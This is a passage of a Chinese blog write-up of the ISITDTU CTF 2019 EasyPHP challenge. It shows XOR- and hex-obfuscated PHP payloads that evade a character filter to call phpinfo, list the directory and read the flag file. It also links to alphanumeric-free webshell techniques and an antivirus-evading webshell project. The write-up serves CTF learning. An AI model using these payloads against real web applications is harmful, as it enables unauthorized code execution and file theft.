</code></pre></div><p>接下来就是数学时间了，另外，对于 int 型到 string 的转换，我们可以利用<code>trim</code>进行操作。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>var_dump</span><span class=p>(</span>
    <span class=nx>trim</span><span class=p>(</span>
        <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>*</span>
        <span class=p>((</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>**</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>**</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>*</span>
        <span class=p>((</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>**</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>**</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=p>)</span> <span class=o>-</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>**</span> <span class=p>(</span><span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>+</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span> <span class=o>-</span> <span class=o>!!@</span><span class=nx>a</span> <span class=o>-</span> <span class=o>!!@</span><span class=nx>a</span><span class=o>-</span> <span class=o>!!@</span><span class=nx>a</span><span class=p>)</span>
    <span class=p>)</span> <span class=o>^</span> <span class=o>@</span><span class=nx>AYAXZWZ</span>
<span class=p>);</span><span class=c1>//phpinfo
</span></code></pre></div><p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190713122647.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190713122647.jpg loading=lazy>
</a>
</figure></p>
<p>结果回显<code>you are so close, omg</code></p>
<h3 id=step-4>Step 4</h3>
<p>绕过了正则接下来就是处理每个字符出现次数得小于 13 的问题了。</p>
<p>所以我们需要精简一下异或操作，尽量找一些相同的字符进行操作，我们可以找到如下的异或关系：</p>
<pre tabindex=0><code>p: |A ^ 1|B ^ 2|C ^ 3|H ^ 8|I ^ 9|
h: |Q ^ 9|X ^ 0|Y ^ 1|Z ^ 2|
p: |A ^ 1|B ^ 2|C ^ 3|H ^ 8|I ^ 9|
i: |Q ^ 8|X ^ 1|Y ^ 0|Z ^ 3|
n: |V ^ 8|W ^ 9|X ^ 6|Y ^ 7|Z ^ 4|
f: |Q ^ 7|R ^ 4|T ^ 2|U ^ 3|V ^ 0|W ^ 1|
o: |V ^ 9|W ^ 8|X ^ 7|Y ^ 6|Z ^ 5|
</code></pre><p>尽量找到相同字符进行拼凑，我们就可以得到<code>AYAYYRY ^ 1110746</code>，<code>AYR</code>加上<code>trim</code>中的<code>tim</code>，再加上<code>!!(+*);</code>，我们这样只用 13 个字符得到了<code>phpinfo()</code>。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=p>(</span><span class=nx>AYAYYRY</span><span class=o>^</span><span class=nx>trim</span><span class=p>(((((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>))</span><span class=o>**</span><span class=p>((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>)))</span><span class=o>+</span><span class=p>(((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>))</span><span class=o>**</span><span class=p>((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>)))</span><span class=o>+</span><span class=p>(((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>))</span><span class=o>**</span><span class=p>((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>)))</span><span class=o>+</span><span class=p>(((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>))</span><span class=o>**</span><span class=p>((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>)))</span><span class=o>+</span><span class=p>(((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>))</span><span class=o>**</span><span class=p>((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>)))</span><span class=o>+</span><span class=p>(((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>))</span><span class=o>**</span><span class=p>((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>)))</span><span class=o>+</span><span class=p>(((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>))</span><span class=o>**</span><span class=p>((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>)))</span><span class=o>+</span><span class=p>(((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>))</span><span class=o>**</span><span class=p>((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>)))</span><span class=o>+</span><span class=p>(((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>))</span><span class=o>**</span><span class=p>((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>)))</span><span class=o>+</span><span class=p>(((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>))</span><span class=o>**</span><span class=p>((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>)))</span><span class=o>+</span><span class=p>(((</span><span class=o>!!</span><span class=nx>a</span><span class=o>+!!</span><span class=nx>a</span><span class=p>))</span><span class=o>**</span><span class=p>((</span><span class=o>!!</span><span class=nx>a</span><span class=p>))))))();</span>
</code></pre></div><p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190714001039.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190714001039.png loading=lazy>
</a>
</figure></p>
<p>这里可能需要注意的就是将<code>+</code>进行 urlencode ，因为<code>+</code>在 url 中是空格。</p>
<h3 id=step-5>Step 5</h3>
<p>所以我们只需要按照同样的编码方式，尽量找相同的字符，就可以执行相关的 php 函数了，通过以下步骤就可以拿到 flag 了</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>var_dump</span><span class=p>(</span><span class=nx>scandir</span><span class=p>(</span><span class=nx>getcwd</span><span class=p>()));</span>

<span class=k>array</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span> <span class=p>{</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>=&gt;</span> <span class=nx>string</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=s2>&#34;.&#34;</span> <span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>=&gt;</span> <span class=nx>string</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=s2>&#34;..&#34;</span> <span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>=&gt;</span> <span class=nx>string</span><span class=p>(</span><span class=mi>9</span><span class=p>)</span> <span class=s2>&#34;index.php&#34;</span> <span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=o>=&gt;</span> <span class=nx>string</span><span class=p>(</span><span class=mi>34</span><span class=p>)</span> <span class=s2>&#34;n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt&#34;</span> <span class=p>}</span>

<span class=nx>var_dump</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nx>end</span><span class=p>(</span><span class=nx>scandir</span><span class=p>(</span><span class=nx>getcwd</span><span class=p>()))));</span>

<span class=nx>string</span><span class=p>(</span><span class=mi>34</span><span class=p>)</span> <span class=s2>&#34;ISITDTU{Your PHP skill is so good}&#34;</span>
</code></pre></div><h3 id=another-way-step-1>Another Way-Step 1</h3>
<p>单次异或可能会有一定的局限性，我们也可以通过两次或者多次异或来进行字符串的构造：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=p>(</span><span class=nx>qiqhnin</span><span class=o>^</span><span class=nx>iiiiibi</span><span class=o>^</span><span class=nx>hhhhimh</span><span class=p>)();</span><span class=c1>//phpinfo()
</span></code></pre></div><p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190714004923.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190714004923.png loading=lazy>
</a>
</figure></p>
<h3 id=another-way-step-2>Another Way-Step 2</h3>
<p>接着我们就可以通过十六进制异或来进行字符串操作了。例如：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>print_r</span> <span class=o>^</span> <span class=mh>0xff</span> <span class=o>-&gt;</span> <span class=mh>0x8f8d96918ba08d</span> <span class=o>-&gt;</span> <span class=p>((</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=p>)</span><span class=o>^</span><span class=p>(</span><span class=o>%</span><span class=mi>8</span><span class=nx>f</span><span class=o>%</span><span class=mi>8</span><span class=nx>d</span><span class=o>%</span><span class=mi>96</span><span class=o>%</span><span class=mi>91</span><span class=o>%</span><span class=mi>8</span><span class=nx>b</span><span class=o>%</span><span class=nx>a0</span><span class=o>%</span><span class=mi>8</span><span class=nx>d</span><span class=p>))</span>
<span class=nx>scandir</span> <span class=o>^</span> <span class=mh>0xff</span> <span class=o>-&gt;</span> <span class=mh>0x8c9c9e919b968d</span> <span class=o>-&gt;</span> <span class=p>((</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=p>)</span><span class=o>^</span><span class=p>(</span><span class=o>%</span><span class=mi>8</span><span class=nx>c</span><span class=o>%</span><span class=mi>9</span><span class=nx>c</span><span class=o>%</span><span class=mi>9</span><span class=nx>e</span><span class=o>%</span><span class=mi>91</span><span class=o>%</span><span class=mi>9</span><span class=nx>b</span><span class=o>%</span><span class=mi>96</span><span class=o>%</span><span class=mi>8</span><span class=nx>d</span><span class=p>))</span>
      <span class=o>.</span> <span class=o>^</span> <span class=mh>0xff</span> <span class=o>-&gt;</span> <span class=mh>0xd1</span>             <span class=o>-&gt;</span> <span class=p>((</span><span class=o>%</span><span class=nx>ff</span><span class=p>)</span><span class=o>^</span><span class=p>(</span><span class=o>%</span><span class=nx>d1</span><span class=p>))</span>
</code></pre></div><p>当然也可以不使用 0xff ，使用以下 payload 就可以在没有字符限制的时候进行列目录了：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=p>((</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=p>)</span><span class=o>^</span><span class=p>(</span><span class=o>%</span><span class=mi>8</span><span class=nx>f</span><span class=o>%</span><span class=mi>8</span><span class=nx>d</span><span class=o>%</span><span class=mi>96</span><span class=o>%</span><span class=mi>91</span><span class=o>%</span><span class=mi>8</span><span class=nx>b</span><span class=o>%</span><span class=nx>a0</span><span class=o>%</span><span class=mi>8</span><span class=nx>d</span><span class=p>))(((</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=p>)</span><span class=o>^</span><span class=p>(</span><span class=o>%</span><span class=mi>8</span><span class=nx>c</span><span class=o>%</span><span class=mi>9</span><span class=nx>c</span><span class=o>%</span><span class=mi>9</span><span class=nx>e</span><span class=o>%</span><span class=mi>91</span><span class=o>%</span><span class=mi>9</span><span class=nx>b</span><span class=o>%</span><span class=mi>96</span><span class=o>%</span><span class=mi>8</span><span class=nx>d</span><span class=p>))(((</span><span class=o>%</span><span class=nx>ff</span><span class=p>)</span><span class=o>^</span><span class=p>(</span><span class=o>%</span><span class=nx>d1</span><span class=p>))));</span>
</code></pre></div><h3 id=another-way-step-3>Another Way-Step 3</h3>
<p>通过总结我们所需要的字母：<code>._acdinprst</code>，然后进行类似的构造：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>t</span> <span class=o>=</span> <span class=nx>s</span><span class=o>^</span><span class=nx>c</span><span class=o>^</span><span class=nx>d</span>
<span class=nx>n</span> <span class=o>=</span> <span class=nx>i</span><span class=o>^</span><span class=nx>c</span><span class=o>^</span><span class=nx>d</span>
<span class=nx>r</span> <span class=o>=</span> <span class=nx>a</span><span class=o>^</span><span class=nx>c</span><span class=o>^</span><span class=nx>p</span>

<span class=nx>print_r</span> <span class=o>-&gt;</span> <span class=p>((</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=p>)</span><span class=o>^</span><span class=p>(</span><span class=o>%</span><span class=mi>8</span><span class=nx>f</span><span class=o>%</span><span class=mi>9</span><span class=nx>e</span><span class=o>%</span><span class=mi>96</span><span class=o>%</span><span class=mi>96</span><span class=o>%</span><span class=mi>8</span><span class=nx>c</span><span class=o>%</span><span class=nx>a0</span><span class=o>%</span><span class=mi>9</span><span class=nx>e</span><span class=p>)</span><span class=o>^</span><span class=p>(</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=mi>9</span><span class=nx>c</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=mi>9</span><span class=nx>c</span><span class=o>%</span><span class=mi>9</span><span class=nx>c</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=mi>9</span><span class=nx>c</span><span class=p>)</span><span class=o>^</span><span class=p>(</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=mi>8</span><span class=nx>f</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=mi>9</span><span class=nx>b</span><span class=o>%</span><span class=mi>9</span><span class=nx>b</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=mi>8</span><span class=nx>f</span><span class=p>))</span>
<span class=nx>scandir</span> <span class=o>-&gt;</span> <span class=p>((</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=p>)</span><span class=o>^</span><span class=p>(</span><span class=o>%</span><span class=mi>8</span><span class=nx>c</span><span class=o>%</span><span class=mi>9</span><span class=nx>c</span><span class=o>%</span><span class=mi>9</span><span class=nx>e</span><span class=o>%</span><span class=mi>96</span><span class=o>%</span><span class=mi>9</span><span class=nx>b</span><span class=o>%</span><span class=mi>96</span><span class=o>%</span><span class=mi>9</span><span class=nx>e</span><span class=p>)</span><span class=o>^</span><span class=p>(</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=mi>9</span><span class=nx>c</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=mi>9</span><span class=nx>c</span><span class=p>)</span><span class=o>^</span><span class=p>(</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=mi>9</span><span class=nx>b</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=nx>ff</span><span class=o>%</span><span class=mi>8</span><span class=nx>f</span><span class=p>))</span>
</code></pre></div><p>即可进行函数操作了</p>
<h3 id=another-way-2>Another Way 2</h3>
<p>看这题的时候想起了p牛的几篇文章，大家可以参考一下：</p>
<p><a class=link href=https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html target=_blank rel=noopener>一些不包含数字和字母的webshell</a></p>
<p><a class=link href=https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html target=_blank rel=noopener>无字母数字webshell之提高篇</a></p>
<p>这两篇也给了我当时很大的启发以及思路。尤其是第二篇中的 payload ，其实可以直接拿来用</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190714230842.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190714230842.png loading=lazy>
</a>
</figure></p>
<p>大家可以详细的参考这两篇文章，p牛第一篇是通过位运算以及自增来进行操作，第二篇在 php7 环境下则是通过取反来进行操作，这里前面就简单介绍了一下通过异或的操作形式。</p>
<h3 id=bonus>Bonus</h3>
<p>题外话，看到 @Mr.Liu 师傅写的一个随机异或免杀的马，还是比较有意思的一个项目:<a class=link href=https://github.com/yzddmr6/webshell-venom target=_blank rel=noopener>Github地址</a></p>
<h1 id=reference>Reference</h1>
<p>[EasyPHP (871 points)](<a class=link href=https://github.com/Samik081/ctf-writeups/blob/master/ISITDTU target=_blank rel=noopener>https://github.com/Samik081/ctf-writeups/blob/master/ISITDTU</a> CTF 2019 Quals/web/easyphp.md)</p>
<p><a class=link href=https://github.com/jesux/ctf-write-ups/tree/master/isitdtu-2019/EasyPHP target=_blank rel=noopener>ISITDTU CTF 2019 - EasyPHP</a></p>
<p><a class=link href=https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html target=_blank rel=noopener>一些不包含数字和字母的webshell</a></p>
<p><a class=link href=https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html target=_blank rel=noopener>无字母数字webshell之提高篇</a></p>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/tags/CTF/>CTF</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
<div class="notice notice-tip">
<div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div>
<p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br>
<p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br>
</div>
</footer>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>Related contents</h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/2022/01/08/2022-01-08-TheEndOfLFI/>
<div class=article-details>
<h2 class=article-title>hxp CTF 2021 - The End Of LFI?</h2>
</div>
</a>
</article>
<article>
<a href=/2021/12/27/2021-12-20-ANewNovelLFI/>
<div class=article-details>
<h2 class=article-title>hxp CTF 2021 - A New Novel LFI</h2>
</div>
</a>
</article>
<article>
<a href=/2021/08/02/cybrics-checkin-2021/>
<div class=article-details>
<h2 class=article-title>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</h2>
</div>
</a>
</article>
<article>
<a href=/2021/07/21/google-qual-2021/>
<div class=article-details>
<h2 class=article-title>Two Webs' Writeup in Google CTF Quals 2021</h2>
</div>
</a>
</article>
<article>
<a href=/2021/05/19/tls-ctf/>
<div class=article-details>
<h2 class=article-title>TLS-Poison 攻击方式在 CTF 中的利用实践</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<div class=disqus-container>
<div id=disqus_thread></div>
<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//ZeddYu.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
</div>
<style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style>
<script>window.addEventListener('onColorSchemeChange',a=>{DISQUS&&DISQUS.reset({reload:!0})})</script>
<footer class=site-footer>
<section class=copyright>
&copy;
2018 -
2022 Zeddy's Blog
</section>
<section class=powerby>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
